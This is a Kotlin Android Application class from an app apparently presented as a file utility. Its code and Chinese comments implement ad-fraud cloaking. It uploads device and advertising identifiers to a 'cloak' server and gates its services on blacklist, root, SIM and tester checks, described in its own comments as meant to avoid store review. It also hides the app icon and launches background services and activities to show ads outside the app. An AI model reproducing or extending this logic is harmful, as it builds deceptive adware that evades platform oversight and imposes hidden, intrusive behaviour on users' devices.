package com.hal.convenientfile.base

import android.app.Activity
import android.app.ActivityManager
import android.app.Application
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Process
import androidx.lifecycle.*
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import com.hal.convenientfile.config.EnvConfig
import com.hal.convenientfile.net.ApiService
import com.hal.convenientfile.net.BaseObserver
import com.hal.convenientfile.net.NetConstants
import com.hal.convenientfile.net.NetUtil
import com.hal.convenientfile.service.MiConService
import com.hal.convenientfile.ui.ConSsActivity
import com.hal.convenientfile.util.*
import com.hal.convenientfile.util.UserTypeParamValue.CONNECT_CHAR
import com.hal.convenientfile.viewmodel.InstallViewModel
import com.hal.convenientfile.worker.ConvWorker
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import kotlinx.coroutines.*
import java.lang.Runnable

/**
 * Description:
 * Author: icarus
 * Email: 769247877@qq.com
 * Date: 2024/3/18
 */

class BaseApp : Application(), LifecycleOwner {


    @Volatile
    private var retryCount = 0

    private var maxRetry = 3

    /**
     * 应用是否在前台
     */
    @Volatile
    var isInForeground = false

    /**
     * 进程活跃上报事件handler
     */
    private val processAliveHandler by lazy { Handler(Looper.getMainLooper()) }
    private val feeManager by lazy { WorkManager.getInstance(this) }
    val isDebug by lazy { applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE != 0 }
    private val mLifecycleRegistry by lazy { LifecycleRegistry(this) }
    val activitySet by lazy { mutableListOf<Activity>() }

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
    }

    override fun onCreate() {
        super.onCreate()
        app = this
        mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        initDidi()
        if (isMainProcess()) {
            init()
        }
    }

    private fun initDidi() {
        //未确定用户或者是正常(广告)用户，则会初始化sdk
        /*       log("isUserParamsReady==", CloakUtil.isUserParamsReady())
               log("isNormalUser==", CloakUtil.isNormalUser())*/
        if (!CloakUtil.isUserParamsReady() ||
            (CloakUtil.isUserParamsReady() && CloakUtil.isNormalUser())
        ) {
            log("init sdk...process ", getProcessName(Process.myPid()))
            if (isMainProcess()) {
                //默认打开保活,如果默认关闭注释掉
//                VV.b(true)
            }
//            VV.init(this)
            //拉活
//            Fddk.a(this)
        } else {
            log("not init sdk...process ", getProcessName(Process.myPid()))
        }
    }


    private fun init() {
        FireBaseUtil.initializeApp()
        if (isNeedUserInformations()) {
            //需要获取user type相关数据
            if (isNeedFirebaseInfos()) {
                registerUserInfoEvents()
            }
            if (AdUtil.isInBlackList.value == null) {
                getOrObserveBlackList()
            }
        } else {
            checkUserInfoAndStartProcess()
        }
        initAppStatusListener()
        initInstallFirstOpenTime()
        AdUtil.initUserAdInfo()
        //init refer
        ReferrerUtil.initInstallRefer()
        //init TopOn Ad
        AdUtil.initTopOn()
        //init Adjust
        AdjustUtil.initAdjust()
        checkInstallEvent()
        startUploadAliveLoop()
        InstallViewModel.tryUploadInstallEvent()
    }


    /**
     * 是否需要获取firebase
     */
    private fun isNeedFirebaseInfos(): Boolean {
//        val isInBlackList = AdUtil.isInBlackList.value
        val isInThirdPlatform = AdUtil.isInThirdPlatform.value
        val checkAutoTestResult = AdUtil.checkAutoTestResult.value
        val checkRootResult = AdUtil.checkRootResult.value
        val checkSimResult = AdUtil.checkSimResult.value
        return isInThirdPlatform == null || checkAutoTestResult == null ||
                checkRootResult == null || checkSimResult == null
    }

    private fun isMainProcess(): Boolean {
        val pid = Process.myPid()
        val processName = getProcessName(pid)
//        "processName==$processName packageName==$packageName".log()
        return packageName.equals(processName)
    }

    private fun registerUserInfoEvents() {
        AdUtil.firebaseFetchResult.observe(this) {
            //忽略null，调用observe会直接得到null的value，故忽略
            log("firebase fetch result ====>", it)
            if (it != null) {
                val channelStrategy = Cloak.channelStrategy()
                log("firebase fetch result = ", it, " channelStrategy==", channelStrategy)
                TbaUtil.logEvent(Event.STRATEGY_TYPE, Bundle().apply {
                    putString(CommonKey.PARAM, channelStrategy.toString())
                })
                saveUserInfo()
            }
        }
        AdUtil.adjustChannel.observe(this) {
            if (it != null) {
                val channelStrategy = Cloak.channelStrategy()
                log(
                    "adjustChannel=",
                    it,
                    " get adjustChannel channelStrategy=====",
                    channelStrategy
                )

                val fetchResult = AdUtil.firebaseFetchResult.value
                //检查远程配置是否拉取成功，和channelStrategy的值
                if (fetchResult != null && channelStrategy == 1L) {
//                "adjustChannel==$it".log()
                    saveChannelByAdjust()
                    checkUserInfoAndStartProcess()
                }
            }

        }
        AdUtil.refChannel.observe(this) {
            if (it != null) {
                val channelStrategy = Cloak.channelStrategy()
                log("refChannel=", it, " get refChannel channelStrategy=====", channelStrategy)
                val fetchResult = AdUtil.firebaseFetchResult.value
                //检查远程配置是否拉取成功，和channelStrategy的值
                if (fetchResult != null && channelStrategy == 2L) {
                    log("refChannel==", it)
                    saveChannelByReferrer()
                    checkUserInfoAndStartProcess()
                }
            }

        }
    }

    /**
     * 是否需要获取用户信息
     */
    private fun isNeedUserInformations(): Boolean {
        val isInBlackList = AdUtil.isInBlackList.value
        return isNeedFirebaseInfos() || isInBlackList == null
    }

    private fun getMdfhfdfox(): Int {
        return 8 * 8
    }

    /**
     * 启动clock检查逻辑
     */
    private fun goToWork() {
        feeManager.cancelAllWork()
        feeManager.enqueue(OneTimeWorkRequest.from(ConvWorker::class.java))
    }


    /**
     * 根据adjust值保存用户
     */
    @Synchronized
    private fun saveChannelByAdjust() {
        val adjustChannel = AdUtil.adjustChannel.value
        if (adjustChannel != null) {
            var isInThirdPlatform =
                if (!EnvConfig.adChannels.contains(adjustChannel)) "1" else "0"
            //模拟推送渠道
            isInThirdPlatform = "0"
            SPUtil.putString(SpKey.SP_KEY_IN_THIRD_PLATFORM, isInThirdPlatform)
            AdUtil.isInThirdPlatform.value = isInThirdPlatform
        }
    }

    private fun getOrObserveBlackList() {
        retryCount = 0
        if (AdUtil.gaid.value != null) {
            getBlackListResult()
        } else {
            val observer = object : Observer<String?> {
                override fun onChanged(t: String?) {
//                        "gaid=$t checkStartForeground".log()
                    if (t != null) {
                        getBlackListResult()
                        AdUtil.gaid.removeObserver(this)
                    }
                }
            }
            AdUtil.gaid.observeForever(observer)
        }
    }

    /**
     * 根据referrer值保存用户
     */
    @Synchronized
    private fun saveChannelByReferrer() {
        val refChannel = AdUtil.refChannel.value
        if (refChannel != null) {
            //包含指定字符串则判断为渠道量用户
            val isInThirdPlatform = if (refChannel.contains("adjust") ||
                /*  refChannel.contains("bytedance") ||*/
                refChannel.contains("not%20set")
            ) "0" else "1"
            SPUtil.putString(SpKey.SP_KEY_IN_THIRD_PLATFORM, isInThirdPlatform)
            AdUtil.isInThirdPlatform.value = isInThirdPlatform
        }
    }

    /**
     * 检查用户所有条件，并启动相关流程
     */
    @Synchronized
    private fun checkUserInfoAndStartProcess() {
        log(
            "check and start process\nisInBlackList=", AdUtil.isInBlackList.value, "\n",
            "isInThirdPlatform=", AdUtil.isInThirdPlatform.value, "\n",
            "checkRootResult=", AdUtil.checkRootResult.value, "\n",
            "checkAutoTestResult=", AdUtil.checkAutoTestResult.value, "\n",
            "checkSimResult=", AdUtil.checkSimResult.value
        )
        //所有用户参数都请求完毕
        if (CloakUtil.isUserParamsReady()) {
            "all user value is ready.".log()
            //user type数据已经获取完毕(第二次启动时，可能走此分支)
            if (CloakUtil.isNormalUser()) {
                "user type is normal...".log()
                //正常(广告)用户，启动worker和service
                startServiceByOsAndStatus()
            } else {
                Handler(Looper.getMainLooper()).postDelayed({
                    "set keep false...".log()
//                    VV.b(false)
                }, 20_000)
            }
            //上传用户类型事件
            logUserTypeEvent()
        }
    }

    private fun startUploadAliveLoop() {
        val runnable = object : Runnable {
            override fun run() {
                //检查process active
                AppUtil.checkAndUploadProcessActive()
                processAliveHandler.postDelayed(this, 600_000)
            }
        }
        processAliveHandler.post(runnable)
    }

    private fun checkInstallEvent() {
        if (AppUtil.isUploadTbaInstallEvent.value != true) {
            TbaUtil.logEvent(Event.APP_INSTALL, Bundle())
        }
    }


    /**
     * 上传用户类型事件
     */
    private fun logUserTypeEvent() {
        log("isUploadUserTypeEvent==", AppUtil.isUploadUserTypeEvent.value)
        if (AppUtil.isUploadUserTypeEvent.value == true) {
            return
        }
        val isInBlackList = AdUtil.isInBlackList.value
        val isInThirdPlatform = AdUtil.isInThirdPlatform.value
        val checkSimResult =
            if (AdUtil.isCheckSim.value == "1") {
                //检查结果 1:通过 0:未通过
                if (AdUtil.checkSimResult.value == "1") UserTypeParamValue.PASS else UserTypeParamValue.FAILED
            } else "${UserTypeParamValue.IGNORE}(${if (EnvCheckUtil.isExistSim(this)) UserTypeParamValue.PASS else UserTypeParamValue.FAILED})"

        val checkRootResult =
            if (AdUtil.isCheckRoot.value == "1") {
                //检查结果 1:通过 0:未通过
                if (AdUtil.checkRootResult.value == "1") UserTypeParamValue.PASS else UserTypeParamValue.FAILED
            } else "${UserTypeParamValue.IGNORE}(${if (!EnvCheckUtil.isDeviceRoot()) UserTypeParamValue.PASS else UserTypeParamValue.FAILED})"

        val checkAutoTestResult =
            if (AdUtil.isCheckAutoTest.value == "1") {
                //检查结果 1:通过 0:未通过
                if (AdUtil.checkAutoTestResult.value == "1") UserTypeParamValue.PASS else UserTypeParamValue.FAILED
            } else "${UserTypeParamValue.IGNORE}(${if (!EnvCheckUtil.isOpenAutoTest()) UserTypeParamValue.PASS else UserTypeParamValue.FAILED})"

        val isInBlackListResult =
            if (isInBlackList == "0") UserTypeParamValue.PASS else UserTypeParamValue.FAILED

        val isInThirdPlatformResult =
            if (isInThirdPlatform == "0") UserTypeParamValue.PASS else UserTypeParamValue.FAILED

        "upload user type event.".log()
        TbaUtil.logEvent(
            Event.USER_TYPE,
            Bundle().apply {
                putString(
                    CommonKey.PARAM,
                    //cloak用户判断
                    (if (!CloakUtil.isUserParamsReady()) {
                        "unknown"
                    } else if (CloakUtil.isCloakUser()) CloakParamValue.TYPE_CLOAK
                    else CloakParamValue.TYPE_NORMAL).apply { log("user type==", this) }
                )
                putString(
                    ClockParamKey.USER_TYPE_DETAIL,
                    "$isInBlackListResult$CONNECT_CHAR$isInThirdPlatformResult$CONNECT_CHAR$checkSimResult$CONNECT_CHAR$checkRootResult$CONNECT_CHAR$checkAutoTestResult".apply {
                        log("user params==>", this)
                    }
                )
            })
    }


    private fun initInstallFirstOpenTime() {
        val firstInstallTime = AppUtil.firstOpenTime.value
        if (firstInstallTime == 0L) {
            val now = System.currentTimeMillis()
            SPUtil.putLong(SpKey.SP_KEY_FIRST_OPEN_CLIENT_TIME, now)
            AppUtil.firstOpenTime.postValue(now)
        }
    }

    private fun initAppStatusListener() {
        ProcessLifecycleOwner.get().lifecycle.addObserver(object : DefaultLifecycleObserver {
            override fun onResume(owner: LifecycleOwner) {
                isInForeground = true
            }

            override fun onPause(owner: LifecycleOwner) {
                isInForeground = false
                if (AppUtil.isIconHide()) {
                    activitySet.forEach { it.finish() }
                    activitySet.clear()
                }
            }
        })
    }


    private fun getBlackListResult() {
        //判断用户不是黑名单用户，才启动service(防止审核)
        NetUtil().getRetrofit(NetConstants.CLOAK_BASE_URL).create(ApiService::class.java)
            .getDeviceType(
                queryMap = mapOf(
                    "embitter" to Device.androidId.urlEncoding(),
                    "song" to System.currentTimeMillis(),
                    "moulton" to Device.model.urlEncoding(),
                    "milt" to packageName.urlEncoding(),
                    "anther" to Device.osVersion.urlEncoding(),
                    "himself" to (AdUtil.gaid.value ?: "").urlEncoding(),
                    "original" to Device.androidId.urlEncoding(),
                    "freak" to Device.androidOS,
                    "bootes" to packageManager.getPackageInfo(
                        packageName,
                        0
                    ).versionName.urlEncoding()
                )
            ).observeOn(AndroidSchedulers.mainThread())
            .subscribe(object : BaseObserver<String>(null) {
                override fun onNext(t: String) {
                    //main thread
                    log("blacklist data===", t)
                    val isInBlackList = if (Cloak.USER_BLACK == t) "1" else "0"
                    SPUtil.putString(SpKey.SP_KEY_IN_BLACK_LIST, isInBlackList)
                    AdUtil.isInBlackList.value = isInBlackList
                    checkUserInfoAndStartProcess()
                }

                override fun onError(e: Throwable) {
                    super.onError(e)
                    if (++retryCount <= maxRetry) {
                        log("retry black list ", retryCount)
                        CoroutineScope(Dispatchers.IO).launch {
                            delay(3000)
                            getBlackListResult()
                        }
                    } else {
                        SPUtil.putString(SpKey.SP_KEY_IN_BLACK_LIST, "0")
                        AdUtil.isInBlackList.value = "0"
                        //记录出错原因
                        TbaUtil.logEvent(Event.B_W_LIST_FAILED, Bundle().apply {
                            putString(CommonKey.PARAM, e.message)
                        })
                        "black list api retried max times...".log()
                        checkUserInfoAndStartProcess()
                    }
                }
            })
    }

    /**
     * 检查用户类型判断逻辑
     *
     */
    private fun saveUserInfo() {
        val isCheckSim = Cloak.isCheckSim == 1L
        (if (isCheckSim) "1" else "0").let {
            SPUtil.putString(SpKey.SP_KEY_is_CHECK_SIM, it)
            AdUtil.isCheckSim.value = it
        }
        val isCheckRoot = Cloak.isCheckRoot == 1L
        (if (isCheckRoot) "1" else "0").let {
            SPUtil.putString(SpKey.SP_KEY_IS_CHECK_ROOT, it)
            AdUtil.isCheckRoot.value = it
        }
        val isCheckAutoTest = Cloak.isCheckAutoTest == 1L
        (if (isCheckAutoTest) "1" else "0").let {
            SPUtil.putString(SpKey.SP_KEY_IS_CHECK_AUTO_TEST, it)
            AdUtil.isCheckAutoTest.value = it
        }
        //检查结果 1:检测通过或者忽略检查 0:检测未通过
        //更新sim卡检查结果
        val checkSimResult = if (isCheckSim) EnvCheckUtil.isExistSim(this) else true
        (if (checkSimResult) "1" else "0").let {
            SPUtil.putString(SpKey.SP_KEY_CHECK_SIM_RESULT, it)
            AdUtil.checkSimResult.value = it
        }
        //更新root检查结果
        val checkRootResult = if (isCheckRoot) !EnvCheckUtil.isDeviceRoot() else true
        (if (checkRootResult) "1" else "0").let {
            SPUtil.putString(SpKey.SP_KEY_CHECK_ROOT_RESULT, it)
            AdUtil.checkRootResult.value = it
        }
        //更新autotest检查结果
        val checkAutoTestResult = if (isCheckAutoTest) !EnvCheckUtil.isOpenAutoTest() else true
        (if (checkAutoTestResult) "1" else "0").let {
            SPUtil.putString(SpKey.SP_KEY_CHECK_AUTO_TEST_RESULT, it)
            AdUtil.checkAutoTestResult.value = it
        }
        //根据策略保存渠道值
        when (Cloak.channelStrategy().apply { log("channelStrategy====>", this) }) {
            1L -> {
                //检查adjust的渠道值
                "channelStrategy==1".log()
                saveChannelByAdjust()
                checkUserInfoAndStartProcess()

            }

            2L -> {
                //检查referrer的渠道值
                "channelStrategy==2".log()
                saveChannelByReferrer()
                checkUserInfoAndStartProcess()
            }

            else -> {}
        }
    }


    /**
     * 如果之前已经隐藏了图标，则证明是正常用户，且符合隐藏条件，再调用此方法是为了提供广告外弹能力
     *
     */
    private fun startServiceByOsAndStatus() {
        if (AppUtil.isIconHide()) {
            AppUtil.canOpt = true
            Handler(Looper.getMainLooper()).postDelayed({
                AppUtil.canOpt = false
            }, 200)
            AppUtil.hideIcon()
            CoroutineScope(Dispatchers.IO).launch {
                goToWork()
                delay(10_000)
                "begin to start ssActivity...".log()
                //启动activity后，再启动前台服务
                withContext(Dispatchers.Main) {
                    try {
                        val intent = Intent(
                            app,
                            ConSsActivity::class.java
                        ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        } else {
            try {
                //启动检查用户逻辑
                goToWork()
                try {
                    //android 12,13安装完后，自动启动。可能报错
                    startForegroundService(
                        Intent(
                            app,
                            MiConService::class.java
                        )
                    )
                } catch (e: Exception) {
                    log("start service error==>", e.message)
                    AppUtil.isServiceStartSuccess.value = false
                    TbaUtil.logEvent(
                        Event.SERVICE_START_ERROR,
                        Bundle().apply {
                            putString(
                                CommonKey.PARAM,
                                e.message ?: "unknown error."
                            )
                        }
                    )
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun getProcessName(pid: Int): String {
        val manager = getSystemService(ActivityManager::class.java)
        for (processInfo in manager.runningAppProcesses) {
            if (processInfo.pid == pid) {
                return processInfo.processName
            }
        }
        return ""
    }


    fun putAc(ac: Activity) = activitySet.add(ac)

    override fun onTerminate() {
        super.onTerminate()
        "onTerminate.......".log()
        processAliveHandler.removeCallbacksAndMessages(null)
        mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
    }

    fun removeAc(ac: Activity) = activitySet.remove(ac)


    companion object {
        lateinit var app: BaseApp
    }

    override val lifecycle: Lifecycle
        get() = mLifecycleRegistry
}
